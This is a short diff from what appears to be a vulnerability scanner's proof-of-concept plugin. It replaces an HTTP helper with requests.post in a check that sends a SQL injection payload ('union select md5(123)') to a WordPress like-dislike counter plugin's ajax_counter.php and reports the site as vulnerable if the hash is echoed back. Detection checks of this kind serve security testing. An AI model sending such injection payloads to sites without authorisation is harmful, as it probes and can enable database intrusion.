@@ -37,9 +37,9 @@ class Poc(ABPoc):
             url = arg
             target = url + '/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php'
             post_data = 'post_id=1/**/and/**/1%3d2/**/union/**/select%20md5(123)%23&up_type=c_like'
-            code, head, res, _,_  = hh.http('-d %s %s' % (post_data,target))
-                       
-            if code == 200 and '202cb962ac59075b964b07152d234b70' in res :
+            res = requests.post(target, data=post_data)
+
+            if res.status_code == 200 and '202cb962ac59075b964b07152d234b70' in res.text :
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
